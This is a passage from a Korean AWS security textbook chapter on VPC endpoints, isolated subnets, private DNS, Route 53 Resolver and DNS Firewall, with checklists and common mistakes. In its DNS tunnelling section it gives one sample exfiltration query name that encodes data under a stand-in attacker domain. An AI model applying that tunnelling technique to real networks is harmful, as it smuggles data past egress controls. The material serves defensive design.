같은 이유로, EC2에서 OS 패키지 저장소·SSM 패치 기준선·CRL 조회 등도 AWS 소유 S3 버킷이나 외부 도메인을 씁니다. 19.6의 마지막 원칙 — **"깨지는 목록을 먼저 만들고 허용목록에 넣은 다음 조인다"** — 를 여기서 반드시 적용하십시오.

### 4단계: 비용 판단

인터페이스 엔드포인트는 **AZ마다 시간당 요금**이 붙습니다. 서비스 10개 × AZ 2개면 시간 요금 20개분입니다. 반면 NAT 게이트웨이도 AZ마다 시간 요금 + 데이터 처리 요금이 듭니다. 실무 판단 기준은 다음과 같습니다.

| 상황 | 권장 |
|---|---|
| S3·DynamoDB 트래픽이 큼 | **게이트웨이 엔드포인트 무조건** — 무료이고 NAT 처리비를 줄임 |
| 엔드포인트 필요 서비스 5개 미만, 트래픽 적음 | 인터페이스 엔드포인트가 대체로 저렴 |
| 서비스가 많고 VPC도 많음 | **중앙 VPC에 엔드포인트를 모으고 Transit Gateway 또는 프라이빗 호스팅 영역으로 공유**(21장) |
| 규제상 인터넷 경로 자체가 금지 | 비용 논쟁 대상 아님 — 격리가 요건 |

마지막 행이 핵심입니다. **격리 데이터 서브넷은 비용으로 협상하지 않습니다.** 반면 앱 서브넷은 Network Firewall로 통제된 NAT 경로를 병행하는 하이브리드 구성이 현실적일 때가 많습니다.

### 📋 완전 격리 서브넷 체크리스트

- [ ] 라우팅 테이블에 `0.0.0.0/0`과 `::/0`이 **없다**
- [ ] S3·DynamoDB는 게이트웨이 엔드포인트로만 접근한다
- [ ] 모든 인터페이스 엔드포인트가 **최소 2개 AZ**의 서브넷에 ENI를 갖는다
- [ ] 엔드포인트 전용 SG가 있고, 인바운드는 앱 SG에서 오는 443만이다
- [ ] 모든 엔드포인트에 **Full Access가 아닌 정책**이 붙어 있다(20.3)
- [ ] 관리 접근은 SSM 3종 엔드포인트로 동작하며, **인바운드 22/3389 규칙이 없다**
- [ ] 세션·컨테이너 로그가 실제로 쌓이는지 확인했다(`logs` 엔드포인트)
- [ ] AWS 소유 버킷 예외(ECR 레이어 등)를 반영해 배포가 성공함을 검증했다
- [ ] VPC의 `enableDnsSupport`·`enableDnsHostnames`가 켜져 있다(20.5)
- [ ] NAT 경로 제거 **후** 전체 기능 회귀 테스트를 통과했다

---

## 20.5 프라이빗 DNS와 Route 53 Resolver

### 프라이빗 DNS 활성화가 실제로 하는 일

`--private-dns-enabled` 옵션 하나가 무슨 일을 하는지 정확히 아는 것이 이 절의 출발점입니다.

인터페이스 엔드포인트를 만들면 AWS는 항상 `vpce-0a1b…-xyz.secretsmanager.ap-northeast-2.vpce.amazonaws.com` 같은 **엔드포인트 고유 DNS 이름**을 함께 만듭니다. 이 이름을 쓰려면 애플리케이션 코드나 SDK 설정을 바꿔야 합니다. 프라이빗 DNS를 켜면 AWS가 **VPC에 연결된 관리형 프라이빗 호스팅 영역**을 만들어, 원래의 공개 서비스 이름(`secretsmanager.ap-northeast-2.amazonaws.com`)을 **엔드포인트 ENI의 사설 IP로 해석**하게 만듭니다. 코드 변경이 필요 없어지는 것입니다.

이 동작에는 두 가지 전제가 있습니다.

1. VPC 속성 `enableDnsSupport`와 `enableDnsHostnames`가 **둘 다 켜져** 있어야 합니다. 꺼져 있으면 `--private-dns-enabled` 요청 자체가 실패합니다.
2. 해석을 수행하는 주체는 **VPC 리졸버**(VPC CIDR 기준 `.2` 주소 — ShopMini는 `10.20.0.2`, 또는 링크로컬 `169.254.169.253`)입니다. 인스턴스의 `/etc/resolv.conf`를 사내 DNS 서버로 바꿔 놓으면 프라이빗 DNS가 **조용히 무력화**됩니다.

2번이 실무에서 가장 잘 안 보이는 함정입니다. 엔드포인트는 멀쩡히 있고 요금도 나가는데 트래픽은 전부 NAT로 나갑니다. 검증은 간단합니다.

```bash
# 인스턴스 안에서 — 사설 IP(10.20.x.x)로 나와야 정상
dig +short secretsmanager.ap-northeast-2.amazonaws.com
# 공인 IP가 나오면 엔드포인트를 안 타고 있는 것
```

### 하이브리드에서의 함정

온프레미스에서 Direct Connect나 VPN으로 들어와 인터페이스 엔드포인트를 쓰려는 순간, 프라이빗 DNS가 문제를 일으킵니다. 프라이빗 호스팅 영역은 **VPC 안에서만** 유효하기 때문입니다. 온프레미스 DNS 서버는 `secretsmanager.ap-northeast-2.amazonaws.com`을 그냥 공개 DNS로 해석하고, 결과는 **공인 IP**입니다. 그러면 트래픽은 인터넷으로 나갑니다 — 전용선을 깔아 놓고도 말입니다.

해법은 **Route 53 Resolver 엔드포인트**입니다. 두 종류가 있고 방향이 반대입니다.

| 종류 | 트래픽 방향 | 용도 | ShopMini 적용 |
|---|---|---|---|
| **인바운드(Inbound) 엔드포인트** | 온프레미스 → AWS | 온프레미스 DNS가 AWS의 프라이빗 이름(엔드포인트·프라이빗 호스팅 영역·RDS 이름)을 해석 | 사내 DNS에 **조건부 포워더** 설정: `*.amazonaws.com` → 인바운드 엔드포인트 IP |
| **아웃바운드(Outbound) 엔드포인트** | AWS → 온프레미스 | VPC 안 워크로드가 사내 도메인(`corp.example.internal`)을 해석 | Resolver 규칙(FORWARD)으로 사내 도메인을 사내 DNS로 전달 |

즉 **온프레미스에서 엔드포인트를 쓰려면 인바운드 엔드포인트**, **VPC에서 사내 이름을 쓰려면 아웃바운드 엔드포인트**입니다. 두 엔드포인트 모두 최소 2개 AZ에 IP를 배치해야 하며, 각각 시간 요금이 붙습니다.

Resolver 규칙은 계정마다 만들 필요가 없습니다.

> 📖 *AWS Security Cookbook* 10장 「Setting up and using AWS Resource Access Manager」: **"AWS RAM은 AWS 리소스를 다른 AWS 계정이나 우리 AWS Organization 안에서 안전하게 공유할 수 있게 해준다. 공유할 수 있는 리소스에는 AWS Transit Gateway, 서브넷, AWS License Manager 구성, Amazon Route 53 Resolver 규칙 등이 포함된다."**

**네트워크 계정에서 Resolver 규칙과 엔드포인트를 한 벌만 운영하고 RAM으로 조직 전체에 공유하는 것**이 표준 패턴입니다. 계정마다 아웃바운드 엔드포인트를 만들면 비용도 관리 부담도 계정 수만큼 늘어납니다.

### DNS는 통제되지 않은 이그레스 경로다

여기서 19.6의 경고로 돌아갑니다. 원서는 이그레스 통제를 논하면서 DNS를 별도로 지목했습니다.

> 📖 *Practical Cloud Security* 2판 6장: **"일반적인 연결을 제한하는 것에 더해, DNS 터널링, ICMP 터널링, 허용된 인바운드 연결의 탈취 같은 다른 유출 경로도 차단하도록 주의해야 한다."**

DNS 터널링이 위험한 이유는 구조적입니다. **완전 격리 서브넷을 만들어도 DNS는 여전히 나갑니다.** 라우팅 테이블에 `0.0.0.0/0`이 없어도 VPC 리졸버는 동작하고, 리졸버는 우리를 대신해 재귀 질의를 수행합니다. 공격자는 데이터를 조각내 서브도메인 이름으로 인코딩하고(`ZGF0YQ.exfil.attacker.example`) 자기 권한 있는 네임서버로 질의를 보내면, 우리가 만든 모든 네트워크 통제를 우회해 데이터를 빼냅니다. **경로를 없애는 전략의 유일한 예외가 DNS입니다.**

그래서 19.6에서 다룬 **Route 53 Resolver DNS Firewall**은 완전 격리 서브넷 설계의 **필수 짝**입니다. 19.6에 규칙 그룹 생성 CLI가 있으므로 여기서는 반복하지 않고, 엔드포인트 설계 관점에서 붙여야 할 것만 정리합니다.

| 통제 | 목적 | 참조 |
|---|---|---|
| AWS 관리형 위협 도메인 목록 BLOCK | 멀웨어·봇넷 C2 도메인 질의 차단 | 19.6 |
| 자체 허용목록 + `*` BLOCK | 격리 서브넷에서 필요한 도메인만 해석 허용 | 19.6 |
| **Resolver 쿼리 로깅** | 어떤 이름을 질의했는지 기록 — 터널링·비콘 탐지의 원천 데이터 | **29장** |
| GuardDuty DNS 기반 탐지 | Resolver 로그를 소스로 한 관리형 탐지 | 30장 |

> 💡 **원서 이후 변경** — 원서 집필 이후 AWS는 DNS Firewall에 **DNS 터널링과 도메인 생성 알고리즘(DGA) 패턴을 질의 흐름 자체에서 탐지하는 고급 기능**을 추가했습니다. 도메인 목록 기반 차단은 "알려진 나쁜 이름"만 잡지만, 이 방식은 **처음 보는 도메인이라도 터널링 형태의 질의 패턴**을 잡는다는 점에서 성격이 다릅니다. 격리 서브넷을 운영한다면 검토 가치가 있습니다. 다만 비용과 오탐 처리 부담이 있으므로 관리형 위협 목록부터 켜고 단계적으로 올리십시오.

> 🔴 **Resolver 쿼리 로깅은 반드시 켜십시오.** DNS Firewall이 차단하지 못한 질의도 로그에는 남습니다. 차단은 실패할 수 있지만 기록은 남고, 침해 조사에서 "언제 어떤 이름을 물었는가"는 가장 먼저 찾는 정보입니다. 로그는 로그 아카이브 계정(`777788889999`)으로 중앙화합니다(29장).

---

## 이 장의 요약

| 항목 | 핵심 |
|---|---|
| 게이트웨이 엔드포인트 | **S3·DynamoDB 전용, 무료.** 라우팅 테이블에 접두사 목록 경로가 자동 추가. SG 적용 불가, 온프레미스에서 사용 불가 |
| 인터페이스 엔드포인트 | 서브넷마다 **ENI + 사설 IP**. 대부분의 서비스 지원. SG로 접근 통제, 프라이빗 DNS로 코드 변경 없이 전환, 온프레미스에서 사용 가능. **AZ당 시간 요금** |
| 엔드포인트의 보안 가치 | 자격 증명이 유출돼도 **VPC 안에 있어야만 쓸 수 있다**(원서: "서비스는 오직 그 가상 IP를 통해서만 접근될 수 있다") |
| 엔드포인트 정책 | **Full Access는 데이터 반출 고속도로.** `aws:PrincipalOrgID`(신원 축) + `aws:ResourceOrgID`/`s3:ResourceAccount`(리소스 축) 두 축을 모두 건다 |
| 이중 통제 | 엔드포인트 정책(나가는 방향) × 버킷 정책 `aws:SourceVpce`(들어오는 방향) = 데이터 경계 |
| 완전 격리 서브넷 | 라우팅 테이블에 `0.0.0.0/0` 없음 + 게이트웨이 엔드포인트 + 인터페이스 엔드포인트. **경로를 없애는 것이 규칙을 쓰는 것보다 강하다** |
| SSM 3종 | `ssm` · `ssmmessages` · `ec2messages`. 세션 로그용 `logs`·S3까지 포함해야 감사 가능 |
| 프라이빗 DNS | VPC 리졸버(`.2`)를 써야 동작. 사내 DNS로 바꾸면 **조용히 무력화** |
| Route 53 Resolver | 인바운드 = 온프레미스→AWS 해석, 아웃바운드 = AWS→사내 해석. RAM으로 규칙 공유 |
| DNS의 예외성 | 격리 서브넷에서도 **DNS는 나간다.** DNS Firewall + 쿼리 로깅이 필수 짝 |

## 🔴 필수 구성 체크리스트

- [ ] S3 게이트웨이 엔드포인트를 **모든** 프라이빗·격리 라우팅 테이블에 연결했다 (무료이므로 예외 없음)
- [ ] 모든 엔드포인트에 **Full Access가 아닌 정책**이 붙어 있다
- [ ] 엔드포인트 정책에 **신원 축**(`aws:PrincipalOrgID`)과 **리소스 축**(`aws:ResourceOrgID` 또는 `s3:ResourceAccount`)이 **둘 다** 있다
- [ ] `shopmini-uploads` 버킷 정책의 `aws:SourceVpce` 값이 실제 엔드포인트 ID와 일치한다(15.4)
- [ ] 인터페이스 엔드포인트는 워크로드와 **동일한 AZ 집합**에 ENI를 갖는다
- [ ] 엔드포인트 전용 SG가 있고 인바운드는 앱 SG 참조 443만이다 (`0.0.0.0/0` 금지)
- [ ] 격리 데이터 서브넷 라우팅 테이블에 `0.0.0.0/0`·`::/0`이 없음을 정기 점검한다
- [ ] SSM 3종 엔드포인트로 관리 접근이 동작하고, 인바운드 SSH/RDP 규칙이 하나도 없다
- [ ] `dig`로 서비스 이름이 **사설 IP**로 해석됨을 인스턴스에서 확인했다
- [ ] Route 53 Resolver 쿼리 로깅이 켜져 있고 로그 아카이브 계정으로 모인다
- [ ] 엔드포인트 정책 변경을 CloudTrail(`ModifyVpcEndpoint`)로 감시한다

## ⚠️ 자주 하는 실수

| 실수 | 결과 | 올바른 구성 |
|---|---|---|
| 엔드포인트만 만들고 정책은 Full Access | 임의 계정 버킷으로 데이터 반출이 **정상 트래픽으로** 성립 | 조직 한정 정책을 엔드포인트 생성과 **동시에** 적용(20.3) |
| 엔드포인트 정책에 신원 축만 넣음 | 우리 역할로 남의 버킷에 쓰는 반출을 막지 못함 | `aws:ResourceOrgID`/`s3:ResourceAccount`로 리소스 축을 함께 건다 |
| 인터페이스 엔드포인트를 1개 AZ에만 생성 | 해당 AZ 장애 시 전 워크로드의 API 호출 실패 + 교차 AZ 요금 | 워크로드가 있는 모든 AZ에 서브넷 지정 |
| 엔드포인트 SG를 기본 SG로 둠 | VPC 안 아무 리소스나 엔드포인트 사용 가능 | 전용 SG + 앱 SG 참조 443 인바운드만 |
| 인스턴스 DNS를 사내 서버로 변경 | 프라이빗 DNS 무력화, 트래픽이 NAT로 우회 | VPC 리졸버 사용 + 사내 도메인은 **아웃바운드 Resolver 엔드포인트**로 위임 |
| 온프레미스에서 게이트웨이 엔드포인트로 S3 접근 시도 | 항상 실패 (구조적으로 불가) | S3 **인터페이스** 엔드포인트 + 인바운드 Resolver 엔드포인트 |
| 조직 한정 정책 적용 후 컨테이너 배포 실패 | ECR 레이어가 AWS 소유 S3 버킷에서 내려오므로 차단됨 | 해당 AWS 관리 버킷에 대한 `s3:GetObject` 예외 문장 추가 |
| NAT를 먼저 지우고 엔드포인트를 나중에 만듦 | 무엇이 깨졌는지 원인 파악 불가, 롤백 | 엔드포인트 → 검증 → NAT 제거 순서 |
| DNS 통제를 빼놓음 | 격리 서브넷에서도 DNS 터널링으로 데이터 유출 가능 | DNS Firewall(19.6) + Resolver 쿼리 로깅(29장) |

## 다음 장 예고

VPC 안에서 인터넷 없이 사는 법을 배웠습니다. 21장은 **VPC 밖과 연결해야 할 때**를 다룹니다. Site-to-Site VPN의 터널 이중화, Direct Connect가 ⚠️ **기본적으로 암호화되지 않는다**는 사실과 그 대응, Transit Gateway의 라우팅 도메인 분리, VPC 피어링의 전이적 라우팅 한계를 차례로 봅니다. 그리고 이 장에서 세 개의 엔드포인트만 준비해 둔 **SSM Session Manager**를 본격적으로 구성하며, 왜 SSH 포트를 열지 않는 것이 정답인지를 결론짓습니다.
